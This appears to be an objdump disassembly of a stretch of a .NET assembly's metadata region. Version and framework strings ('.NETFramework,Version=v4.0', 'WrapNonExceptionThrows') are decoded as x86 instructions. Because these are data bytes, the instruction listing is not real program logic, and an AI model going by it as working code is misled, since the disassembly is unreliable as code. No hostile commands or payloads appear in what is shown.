  40c344:	41                   	inc    %ecx
  40c345:	00 43 00             	add    %al,0x0(%ebx)
  40c348:	29 00                	sub    %eax,(%eax)
  40c34a:	2e 00 00             	add    %al,%cs:(%eax)
  40c34d:	05 58 00 32 00       	add    $0x320058,%eax
  40c352:	00 00                	add    %al,(%eax)
  40c354:	36 9d                	ss popf
  40c356:	ff a4 36 e0 75 45 af 	jmp    *-0x50ba8a20(%esi,%esi,1)
  40c35d:	eb 5b                	jmp    0x40c3ba
  40c35f:	54                   	push   %esp
  40c360:	8a a7 3f 24 00 08    	mov    0x800243f(%edi),%ah
  40c366:	b7 7a                	mov    $0x7a,%bh
  40c368:	5c                   	pop    %esp
  40c369:	56                   	push   %esi
  40c36a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c36d:	89 03                	mov    %eax,(%ebx)
  40c36f:	00 00                	add    %al,(%eax)
  40c371:	01 03                	add    %eax,(%ebx)
  40c373:	20 00                	and    %al,(%eax)
  40c375:	01 02                	add    %eax,(%edx)
  40c377:	06                   	push   %es
  40c378:	0e                   	push   %cs
  40c379:	03 06                	add    (%esi),%eax
  40c37b:	12 09                	adc    (%ecx),%cl
  40c37d:	03 06                	add    (%esi),%eax
  40c37f:	12 60 03             	adc    0x3(%eax),%ah
  40c382:	00 00                	add    %al,(%eax)
  40c384:	02 03                	add    (%ebx),%al
  40c386:	06                   	push   %es
  40c387:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c38d:	03 06                	add    (%esi),%eax
  40c38f:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c394:	03 06                	add    (%esi),%eax
  40c396:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c39c:	06                   	push   %es
  40c39d:	1c 02                	sbb    $0x2,%al
  40c39f:	06                   	push   %es
  40c3a0:	08 04 00             	or     %al,(%eax,%eax,1)
  40c3a3:	00 12                	add    %dl,(%edx)
  40c3a5:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c3aa:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c3b0:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c3b6:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c3b9:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c3bf:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c3c5:	0a 04 00             	or     (%eax,%eax,1),%al
  40c3c8:	01 01                	add    %eax,(%ecx)
  40c3ca:	0a 04 00             	or     (%eax,%eax,1),%al
  40c3cd:	00 12                	add    %dl,(%edx)
  40c3cf:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c3d4:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c3da:	02 03                	add    (%ebx),%al
  40c3dc:	00 00                	add    %al,(%eax)
  40c3de:	1c 03                	sbb    $0x3,%al
  40c3e0:	00 00                	add    %al,(%eax)
  40c3e2:	08 04 00             	or     %al,(%eax,%eax,1)
  40c3e5:	01 01                	add    %eax,(%ecx)
  40c3e7:	08 04 00             	or     %al,(%eax,%eax,1)
  40c3ea:	01 02                	add    %eax,(%edx)
  40c3ec:	0e                   	push   %cs
  40c3ed:	0a 00                	or     (%eax),%al
  40c3ef:	04 02                	add    $0x2,%al
  40c3f1:	1c 12                	sbb    $0x12,%al
  40c3f3:	19 12                	sbb    %edx,(%edx)
  40c3f5:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c3fa:	01 01                	add    %eax,(%ecx)
  40c3fc:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c402:	1c 04                	sbb    $0x4,%al
  40c404:	08 00                	or     %al,(%eax)
  40c406:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c40c:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c40f:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c415:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c418:	00 12                	add    %dl,(%edx)
  40c41a:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c41f:	03 08                	add    (%eax),%ecx
  40c421:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c424:	08 00                	or     %al,(%eax)
  40c426:	08 03                	or     %al,(%ebx)
  40c428:	06                   	push   %es
  40c429:	12 29                	adc    (%ecx),%ch
  40c42b:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c430:	0e                   	push   %cs
  40c431:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c436:	05 06 00 01 1d       	add    $0x1d010006,%eax
  40c43b:	05 1d 05 05 00       	add    $0x5051d,%eax
  40c440:	01 1d 05 0a 05 00    	add    %ebx,0x50a05
  40c446:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c44c:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c452:	01 1d 05 0d 07 06    	add    %ebx,0x6070d05
  40c458:	15 12 31 01 12       	adc    $0x12013112,%eax
  40c45d:	20 09                	and    %cl,(%ecx)
  40c45f:	20 01                	and    %al,(%ecx)
  40c461:	01 15 12 31 01 12    	add    %edx,0x12013112
  40c467:	20 03                	and    %al,(%ebx)
  40c469:	20 00                	and    %al,(%eax)
  40c46b:	1c 03                	sbb    $0x3,%al
  40c46d:	20 00                	and    %al,(%eax)
  40c46f:	02 03                	add    (%ebx),%al
  40c471:	28 00                	sub    %al,(%eax)
  40c473:	1c 03                	sbb    $0x3,%al
  40c475:	06                   	push   %es
  40c476:	12 20                	adc    (%eax),%ah
  40c478:	0b 20                	or     (%eax),%esp
  40c47a:	02 01                	add    (%ecx),%al
  40c47c:	12 20                	adc    (%eax),%ah
  40c47e:	15 12 31 01 12       	adc    $0x12013112,%eax
  40c483:	20 04 20             	and    %al,(%eax,%eiz,1)
  40c486:	00 12                	add    %dl,(%edx)
  40c488:	20 05 20 01 12 20    	and    %al,0x20120120
  40c48e:	0e                   	push   %cs
  40c48f:	05 20 01 12 20       	add    $0x20120120,%eax
  40c494:	0a 05 20 01 12 20    	or     0x20120120,%al
  40c49a:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c49f:	20 08                	and    %cl,(%eax)
  40c4a1:	03 20                	add    (%eax),%esp
  40c4a3:	00 08                	add    %cl,(%eax)
  40c4a5:	05 28 01 12 20       	add    $0x20120128,%eax
  40c4aa:	08 03                	or     %al,(%ebx)
  40c4ac:	28 00                	sub    %al,(%eax)
  40c4ae:	08 03                	or     %al,(%ebx)
  40c4b0:	06                   	push   %es
  40c4b1:	11 24 03             	adc    %esp,(%ebx,%eax,1)
  40c4b4:	06                   	push   %es
  40c4b5:	12 1c 04             	adc    (%esp,%eax,1),%bl
  40c4b8:	20 01                	and    %al,(%ecx)
  40c4ba:	01 0e                	add    %ecx,(%esi)
  40c4bc:	04 20                	add    $0x20,%al
  40c4be:	01 08                	add    %ecx,(%eax)
  40c4c0:	0e                   	push   %cs
  40c4c1:	05 20 01 01 12       	add    $0x12010120,%eax
  40c4c6:	39 04 20             	cmp    %eax,(%eax,%eiz,1)
  40c4c9:	01 01                	add    %eax,(%ecx)
  40c4cb:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c4ce:	01 01                	add    %eax,(%ecx)
  40c4d0:	0b 03                	or     (%ebx),%eax
  40c4d2:	20 00                	and    %al,(%eax)
  40c4d4:	0b 03                	or     (%ebx),%eax
  40c4d6:	20 00                	and    %al,(%eax)
  40c4d8:	0a 03                	or     (%ebx),%al
  40c4da:	20 00                	and    %al,(%eax)
  40c4dc:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c4e1:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c4e6:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c4eb:	01 0e                	add    %ecx,(%esi)
  40c4ed:	0e                   	push   %cs
  40c4ee:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c4f3:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c4f6:	01 02                	add    %eax,(%edx)
  40c4f8:	0e                   	push   %cs
  40c4f9:	03 20                	add    (%eax),%esp
  40c4fb:	00 0e                	add    %cl,(%esi)
  40c4fd:	04 20                	add    $0x20,%al
  40c4ff:	01 01                	add    %eax,(%ecx)
  40c501:	02 04 20             	add    (%eax,%eiz,1),%al
  40c504:	01 01                	add    %eax,(%ecx)
  40c506:	0c 04                	or     $0x4,%al
  40c508:	20 01                	and    %al,(%ecx)
  40c50a:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c510:	1c 04                	sbb    $0x4,%al
  40c512:	20 00                	and    %al,(%eax)
  40c514:	11 24 04             	adc    %esp,(%esp,%eax,1)
  40c517:	20 00                	and    %al,(%eax)
  40c519:	12 2d 03 28 00 0e    	adc    0xe002803,%ch
  40c51f:	03 28                	add    (%eax),%ebp
  40c521:	00 0a                	add    %cl,(%edx)
  40c523:	03 28                	add    (%eax),%ebp
  40c525:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c52b:	1c 04                	sbb    $0x4,%al
  40c52d:	28 00                	sub    %al,(%eax)
  40c52f:	11 24 04             	adc    %esp,(%esp,%eax,1)
  40c532:	00 00                	add    %al,(%eax)
  40c534:	00 00                	add    %al,(%eax)
  40c536:	04 01                	add    $0x1,%al
  40c538:	00 00                	add    %al,(%eax)
  40c53a:	00 04 02             	add    %al,(%edx,%eax,1)
  40c53d:	00 00                	add    %al,(%eax)
  40c53f:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c542:	00 00                	add    %al,(%eax)
  40c544:	00 04 04             	add    %al,(%esp,%eax,1)
  40c547:	00 00                	add    %al,(%eax)
  40c549:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c550:	06                   	push   %es
  40c551:	00 00                	add    %al,(%eax)
  40c553:	00 04 07             	add    %al,(%edi,%eax,1)
  40c556:	00 00                	add    %al,(%eax)
  40c558:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c55b:	00 00                	add    %al,(%eax)
  40c55d:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c560:	00 00                	add    %al,(%eax)
  40c562:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c565:	00 00                	add    %al,(%eax)
  40c567:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c56a:	00 00                	add    %al,(%eax)
  40c56c:	00 06                	add    %al,(%esi)
  40c56e:	00 02                	add    %al,(%edx)
  40c570:	0e                   	push   %cs
  40c571:	12 39                	adc    (%ecx),%bh
  40c573:	08 05 00 01 0e 12    	or     %al,0x120e0100
  40c579:	39 06                	cmp    %eax,(%esi)
  40c57b:	00 02                	add    %al,(%edx)
  40c57d:	0e                   	push   %cs
  40c57e:	05 12 39 05 00       	add    $0x53912,%eax
  40c583:	01 01                	add    %eax,(%ecx)
  40c585:	12 39                	adc    (%ecx),%bh
  40c587:	06                   	push   %es
  40c588:	00 02                	add    %al,(%edx)
  40c58a:	01 12                	add    %edx,(%edx)
  40c58c:	39 0e                	cmp    %ecx,(%esi)
  40c58e:	07                   	pop    %es
  40c58f:	00 02                	add    %al,(%edx)
  40c591:	01 12                	add    %edx,(%edx)
  40c593:	39 1d 05 06 00 02    	cmp    %ebx,0x2000605
  40c599:	01 12                	add    %edx,(%edx)
  40c59b:	39 0d 06 00 02 01    	cmp    %ecx,0x1020006
  40c5a1:	12 39                	adc    (%ecx),%bh
  40c5a3:	0c 06                	or     $0x6,%al
  40c5a5:	00 02                	add    %al,(%edx)
  40c5a7:	01 12                	add    %edx,(%edx)
  40c5a9:	39 02                	cmp    %eax,(%edx)
  40c5ab:	06                   	push   %es
  40c5ac:	00 02                	add    %al,(%edx)
  40c5ae:	01 12                	add    %edx,(%edx)
  40c5b0:	39 0b                	cmp    %ecx,(%ebx)
  40c5b2:	06                   	push   %es
  40c5b3:	00 02                	add    %al,(%edx)
  40c5b5:	01 12                	add    %edx,(%edx)
  40c5b7:	39 0a                	cmp    %ecx,(%edx)
  40c5b9:	04 00                	add    $0x0,%al
  40c5bb:	01 18                	add    %ebx,(%eax)
  40c5bd:	0e                   	push   %cs
  40c5be:	06                   	push   %es
  40c5bf:	00 02                	add    %al,(%edx)
  40c5c1:	02 18                	add    (%eax),%bl
  40c5c3:	10 02                	adc    %al,(%edx)
  40c5c5:	05 20 01 0e 12       	add    $0x120e0120,%eax
  40c5ca:	41                   	inc    %ecx
  40c5cb:	03 00                	add    (%eax),%eax
  40c5cd:	00 0e                	add    %cl,(%esi)
  40c5cf:	04 00                	add    $0x0,%al
  40c5d1:	01 0e                	add    %ecx,(%esi)
  40c5d3:	0e                   	push   %cs
  40c5d4:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c5da:	d5 0a                	aad    $0xa
  40c5dc:	3a 06                	cmp    (%esi),%al
  40c5de:	00 01                	add    %al,(%ecx)
  40c5e0:	12 45 12             	adc    0x12(%ebp),%al
  40c5e3:	49                   	dec    %ecx
  40c5e4:	06                   	push   %es
  40c5e5:	00 01                	add    %al,(%ecx)
  40c5e7:	11 48 11             	adc    %ecx,0x11(%eax)
  40c5ea:	48                   	dec    %eax
  40c5eb:	02 06                	add    (%esi),%al
  40c5ed:	09 03                	or     %eax,(%ebx)
  40c5ef:	06                   	push   %es
  40c5f0:	11 48 04             	adc    %ecx,0x4(%eax)
  40c5f3:	00 00                	add    %al,(%eax)
  40c5f5:	00 80 03 06 12 4d    	add    %al,0x4d120603(%eax)
  40c5fb:	06                   	push   %es
  40c5fc:	00 02                	add    %al,(%edx)
  40c5fe:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c601:	51                   	push   %ecx
  40c602:	06                   	push   %es
  40c603:	00 03                	add    %al,(%ebx)
  40c605:	01 09                	add    %ecx,(%ecx)
  40c607:	09 09                	or     %ecx,(%ecx)
  40c609:	05 00 02 02 0e       	add    $0xe020200,%eax
  40c60e:	0e                   	push   %cs
  40c60f:	05 00 01 01 12       	add    $0x12010100,%eax
  40c614:	20 04 00             	and    %al,(%eax,%eax,1)
  40c617:	01 01                	add    %eax,(%ecx)
  40c619:	0e                   	push   %cs
  40c61a:	18 06                	sbb    %al,(%esi)
  40c61c:	15 12 55 01 15       	adc    $0x15015512,%eax
  40c621:	12 59 0a             	adc    0xa(%ecx),%bl
  40c624:	12 5d 1c             	adc    0x1c(%ebp),%bl
  40c627:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c62d:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40c632:	0e                   	push   %cs
  40c633:	04 20                	add    $0x20,%al
  40c635:	00 00                	add    %al,(%eax)
  40c637:	00 04 40             	add    %al,(%eax,%eax,2)
  40c63a:	00 00                	add    %al,(%eax)
  40c63c:	00 04 10             	add    %al,(%eax,%edx,1)
  40c63f:	00 00                	add    %al,(%eax)
  40c641:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c644:	01 0e                	add    %ecx,(%esi)
  40c646:	0e                   	push   %cs
  40c647:	06                   	push   %es
  40c648:	20 01                	and    %al,(%ecx)
  40c64a:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c64f:	20 02                	and    %al,(%edx)
  40c651:	02 1d 05 1d 05 03    	add    0x3051d05,%bl
  40c657:	06                   	push   %es
  40c658:	11 74 03 06          	adc    %esi,0x6(%ebx,%eax,1)
  40c65c:	11 70 04             	adc    %esi,0x4(%eax)
  40c65f:	20 01                	and    %al,(%ecx)
  40c661:	01 08                	add    %ecx,(%eax)
  40c663:	08 01                	or     %al,(%ecx)
  40c665:	00 08                	add    %cl,(%eax)
  40c667:	00 00                	add    %al,(%eax)
  40c669:	00 00                	add    %al,(%eax)
  40c66b:	00 1e                	add    %bl,(%esi)
  40c66d:	01 00                	add    %eax,(%eax)
  40c66f:	01 00                	add    %eax,(%eax)
  40c671:	54                   	push   %esp
  40c672:	02 16                	add    (%esi),%dl
  40c674:	57                   	push   %edi
  40c675:	72 61                	jb     0x40c6d8
  40c677:	70 4e                	jo     0x40c6c7
  40c679:	6f                   	outsl  %ds:(%esi),(%dx)
  40c67a:	6e                   	outsb  %ds:(%esi),(%dx)
  40c67b:	45                   	inc    %ebp
  40c67c:	78 63                	js     0x40c6e1
  40c67e:	65 70 74             	gs jo  0x40c6f5
  40c681:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c688:	77 73                	ja     0x40c6fd
  40c68a:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c690:	71 08                	jno    0x40c69a
  40c692:	01 00                	add    %eax,(%eax)
  40c694:	02 00                	add    (%eax),%al
  40c696:	00 00                	add    %al,(%eax)
  40c698:	00 00                	add    %al,(%eax)
  40c69a:	05 01 00 00 00       	add    $0x1,%eax
  40c69f:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c6a2:	00 07                	add    %al,(%edi)
  40c6a4:	31 2e                	xor    %ebp,(%esi)
  40c6a6:	30 2e                	xor    %ch,(%esi)
  40c6a8:	30 2e                	xor    %ch,(%esi)
  40c6aa:	30 00                	xor    %al,(%eax)
  40c6ac:	00 65 01             	add    %ah,0x1(%ebp)
  40c6af:	00 29                	add    %ch,(%ecx)
  40c6b1:	2e 4e                	cs dec %esi
  40c6b3:	45                   	inc    %ebp
  40c6b4:	54                   	push   %esp
  40c6b5:	46                   	inc    %esi
  40c6b6:	72 61                	jb     0x40c719
  40c6b8:	6d                   	insl   (%dx),%es:(%edi)
  40c6b9:	65 77 6f             	gs ja  0x40c72b
  40c6bc:	72 6b                	jb     0x40c729
  40c6be:	2c 56                	sub    $0x56,%al
  40c6c0:	65 72 73             	gs jb  0x40c736
  40c6c3:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c6ca:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c6cd:	72 6f                	jb     0x40c73e
  40c6cf:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c6d6:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c6dd:	0e                   	push   %cs
  40c6de:	14 46                	adc    $0x46,%al
  40c6e0:	72 61                	jb     0x40c743
  40c6e2:	6d                   	insl   (%dx),%es:(%edi)
  40c6e3:	65 77 6f             	gs ja  0x40c755
  40c6e6:	72 6b                	jb     0x40c753
  40c6e8:	44                   	inc    %esp
  40c6e9:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c6f0:	61                   	popa
  40c6f1:	6d                   	insl   (%dx),%es:(%edi)
  40c6f2:	65 1f                	gs pop %ds
  40c6f4:	2e 4e                	cs dec %esi
  40c6f6:	45                   	inc    %ebp
  40c6f7:	54                   	push   %esp
  40c6f8:	20 46 72             	and    %al,0x72(%esi)
  40c6fb:	61                   	popa
  40c6fc:	6d                   	insl   (%dx),%es:(%edi)
  40c6fd:	65 77 6f             	gs ja  0x40c76f
  40c700:	72 6b                	jb     0x40c76d
  40c702:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c705:	43                   	inc    %ebx
  40c706:	6c                   	insb   (%dx),%es:(%edi)
  40c707:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c70e:	6f                   	outsl  %ds:(%esi),(%dx)
  40c70f:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c716:	04 49                	add    $0x49,%al
  40c718:	74 65                	je     0x40c77f
  40c71a:	6d                   	insl   (%dx),%es:(%edi)
  40c71b:	00 00                	add    %al,(%eax)
  40c71d:	03 07                	add    (%edi),%eax
  40c71f:	01 08                	add    %ecx,(%eax)
  40c721:	04 00                	add    $0x0,%al
  40c723:	01 08                	add    %ecx,(%eax)
  40c725:	0e                   	push   %cs
  40c726:	05 20 02 08 08       	add    $0x8080220,%eax
  40c72b:	08 03                	or     %al,(%ebx)
  40c72d:	07                   	pop    %es
  40c72e:	01 02                	add    %eax,(%edx)
  40c730:	05 00 00 12 80       	add    $0x80120000,%eax
  40c735:	b5 05                	mov    $0x5,%ch
  40c737:	20 01                	and    %al,(%ecx)
  40c739:	0e                   	push   %cs
  40c73a:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c73f:	12 80 b9 05 20 00    	adc    0x2005b9(%eax),%al
  40c745:	12 80 bd 05 20 01    	adc    0x12005bd(%eax),%al
  40c74b:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c750:	03 02                	add    (%edx),%eax
  40c752:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c757:	14 07                	adc    $0x7,%al
  40c759:	08 0e                	or     %cl,(%esi)
  40c75b:	08 1d 12 80 cd 08    	or     %bl,0x8cd8012
  40c761:	12 80 cd 12 80 d1    	adc    -0x2e7fed33(%eax),%al
  40c767:	12 80 d5 1d 0e 0c    	adc    0xc0e1dd5(%eax),%al
  40c76d:	20 03                	and    %al,(%ebx)
  40c76f:	01 11                	add    %edx,(%ecx)
  40c771:	80 d9 11             	sbb    $0x11,%cl
  40c774:	80 dd 11             	sbb    $0x11,%ch
  40c777:	80 e1 06             	and    $0x6,%cl
  40c77a:	20 01                	and    %al,(%ecx)
  40c77c:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c781:	20 01                	and    %al,(%ecx)
  40c783:	08 08                	or     %cl,(%eax)
  40c785:	07                   	pop    %es
  40c786:	00 01                	add    %al,(%ecx)
  40c788:	1d 12 80 cd 0e       	sbb    $0xecd8012,%eax
  40c78d:	07                   	pop    %es
  40c78e:	20 02                	and    %al,(%edx)
  40c790:	01 12                	add    %edx,(%edx)
  40c792:	80 cd 08             	or     $0x8,%ch
  40c795:	06                   	push   %es
  40c796:	20 01                	and    %al,(%ecx)
  40c798:	01 12                	add    %edx,(%edx)
  40c79a:	80 f1 09             	xor    $0x9,%cl
  40c79d:	20 02                	and    %al,(%edx)
  40c79f:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c7a4:	80 f5 06             	xor    $0x6,%ch
  40c7a7:	20 02                	and    %al,(%edx)
  40c7a9:	01 12                	add    %edx,(%edx)
  40c7ab:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c7b0:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c7b3:	09 20                	or     %esp,(%eax)
  40c7b5:	03 01                	add    (%ecx),%eax
  40c7b7:	12 39                	adc    (%ecx),%bh
  40c7b9:	02 12                	add    (%edx),%dl
  40c7bb:	81 01 05 20 00 12    	addl   $0x12002005,(%ecx)
  40c7c1:	81 05 0b 20 04 01 0e 	addl   $0x981120e,0x104200b
  40c7c8:	12 81 09 
  40c7cb:	11 81 0d 02 09 20    	adc    %eax,0x2009020d(%ecx)
  40c7d1:	04 01                	add    $0x1,%al
  40c7d3:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c7d9:	0c 20                	or     $0x20,%al
  40c7db:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c7e0:	08 08                	or     %cl,(%eax)
  40c7e2:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c7e8:	01 11                	add    %edx,(%ecx)
  40c7ea:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c7f0:	02 12                	add    (%edx),%dl
  40c7f2:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c7f5:	02 08                	add    (%eax),%cl
  40c7f7:	08 05 20 01 08 12    	or     %al,0x12080120
  40c7fd:	25 06 00 02 08       	and    $0x8020006,%eax
  40c802:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c807:	03 08                	add    (%eax),%ecx
  40c809:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c80e:	20 01                	and    %al,(%ecx)
  40c810:	01 12                	add    %edx,(%edx)
  40c812:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c818:	1c 0c                	sbb    $0xc,%al
  40c81a:	07                   	pop    %es
  40c81b:	06                   	push   %es
  40c81c:	1c 02                	sbb    $0x2,%al
  40c81e:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c823:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c829:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c82c:	02 07                	add    (%edi),%al
  40c82e:	20 02                	and    %al,(%edx)
  40c830:	02 08                	add    (%eax),%cl
  40c832:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c838:	01 1d 05 08 08 05    	add    %ebx,0x5080805
  40c83e:	00 02                	add    %al,(%edx)
  40c840:	0e                   	push   %cs
  40c841:	0e                   	push   %cs
  40c842:	0e                   	push   %cs
  40c843:	09 07                	or     %eax,(%edi)
  40c845:	04 12                	add    $0x12,%al
  40c847:	81 3d 1d 05 08 05 05 	cmpl   $0xe020005,0x508051d
  40c84e:	00 02 0e 
  40c851:	0e                   	push   %cs
  40c852:	1c 06                	sbb    $0x6,%al
  40c854:	20 01                	and    %al,(%ecx)
  40c856:	12 81 3d 0e 06 07    	adc    0x7060e3d(%ecx),%al
  40c85c:	03 1d 05 08 08 06    	add    0x6080805,%ebx
  40c862:	15 12 31 01 12       	adc    $0x12013112,%eax
  40c867:	20 05 20 01 13 00    	and    %al,0x130120
  40c86d:	08 04 07             	or     %al,(%edi,%eax,1)
  40c870:	01 12                	add    %edx,(%edx)
  40c872:	20 05 20 01 01 13    	and    %al,0x13010120
  40c878:	00 0e                	add    %cl,(%esi)
  40c87a:	07                   	pop    %es
  40c87b:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c880:	11 81 41 01 12 20    	adc    %eax,0x20120141(%ecx)
  40c886:	12 20                	adc    (%eax),%ah
  40c888:	09 20                	or     %esp,(%eax)
  40c88a:	00 15 11 81 41 01    	add    %dl,0x1418111
  40c890:	13 00                	adc    (%eax),%eax
  40c892:	07                   	pop    %es
  40c893:	15 11 81 41 01       	adc    $0x1418111,%eax
  40c898:	12 20                	adc    (%eax),%ah
  40c89a:	04 20                	add    $0x20,%al
  40c89c:	00 13                	add    %dl,(%ebx)
  40c89e:	00 07                	add    %al,(%edi)
  40c8a0:	07                   	pop    %es
  40c8a1:	04 05                	add    $0x5,%al
  40c8a3:	1d 05 08 08 04       	sbb    $0x4080805,%eax
  40c8a8:	20 01                	and    %al,(%ecx)
  40c8aa:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c8b0:	24 04                	and    $0x4,%al
  40c8b2:	00 01                	add    %al,(%ecx)
  40c8b4:	0b 0a                	or     (%edx),%ecx
  40c8b6:	04 00                	add    $0x0,%al
  40c8b8:	01 0b                	add    %ecx,(%ebx)
  40c8ba:	0e                   	push   %cs
  40c8bb:	04 00                	add    $0x0,%al
  40c8bd:	01 0b                	add    %ecx,(%ebx)
  40c8bf:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c8c4:	0c 06                	or     $0x6,%al
  40c8c6:	00 01                	add    %al,(%ecx)
  40c8c8:	0b 11                	or     (%ecx),%edx
  40c8ca:	81 55 04 00 01 0a 0a 	adcl   $0xa0a0100,0x4(%ebp)
  40c8d1:	04 00                	add    $0x0,%al
  40c8d3:	01 0a                	add    %ecx,(%edx)
  40c8d5:	0e                   	push   %cs
  40c8d6:	04 00                	add    $0x0,%al
  40c8d8:	01 0a                	add    %ecx,(%edx)
  40c8da:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c8df:	0c 06                	or     $0x6,%al
  40c8e1:	00 01                	add    %al,(%ecx)
  40c8e3:	0a 11                	or     (%ecx),%dl
  40c8e5:	81 55 04 00 01 0d 0a 	adcl   $0xa0d0100,0x4(%ebp)
  40c8ec:	04 00                	add    $0x0,%al
  40c8ee:	01 0d 0e 07 07 02    	add    %ecx,0x207070e
  40c8f4:	11 24 11             	adc    %esp,(%ecx,%edx,1)
  40c8f7:	81 55 05 00 01 1d 05 	adcl   $0x51d0100,0x5(%ebp)
  40c8fe:	0c 02                	or     $0x2,%al
  40c900:	1d 05 07 07 02       	sbb    $0x2070705,%eax
  40c905:	1d 05 12 81 59       	sbb    $0x59811205,%eax
  40c90a:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c90f:	11 81 61 11 81 65    	adc    %eax,0x65811161(%ecx)
  40c915:	11 81 69 07 20 02    	adc    %eax,0x2200769(%ecx)
  40c91b:	01 0e                	add    %ecx,(%esi)
  40c91d:	11 81 61 0b 07 06    	adc    %eax,0x6070b61(%ecx)
  40c923:	12 20                	adc    (%eax),%ah
  40c925:	12 20                	adc    (%eax),%ah
  40c927:	1d 0e 0e 08 08       	sbb    $0x8080e0e,%eax
  40c92c:	09 00                	or     %eax,(%eax)
  40c92e:	02 01                	add    (%ecx),%al
  40c930:	12 81 71 11 81 75    	adc    0x75811171(%ecx),%al
  40c936:	05 07 01 12 81       	add    $0x81120107,%eax
  40c93b:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c940:	81 59 06 00 02 07 1d 	sbbl   $0x1d070200,0x6(%ecx)
  40c947:	05 08 06 00 02       	add    $0x2000608,%eax
  40c94c:	0c 1d                	or     $0x1d,%al
  40c94e:	05 08 06 00 02       	add    $0x2000608,%eax
  40c953:	0d 1d 05 08 06       	or     $0x608051d,%eax
  40c958:	00 02                	add    %al,(%edx)
  40c95a:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c960:	02 0b                	add    (%ebx),%cl
  40c962:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c967:	02 06                	add    (%esi),%al
  40c969:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c96e:	02 0a                	add    (%edx),%cl
  40c970:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c975:	03 12                	add    (%edx),%edx
  40c977:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c97e:	07 02 12 
  40c981:	20 02                	and    %al,(%edx)
